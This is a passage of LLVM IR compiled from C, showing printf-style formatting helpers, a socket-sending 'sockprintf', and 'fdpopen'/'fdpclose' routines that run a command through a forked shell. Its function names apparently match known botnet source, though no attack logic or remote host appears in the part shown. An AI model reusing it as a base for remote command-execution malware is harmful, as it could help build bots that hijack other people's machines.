  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.306, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
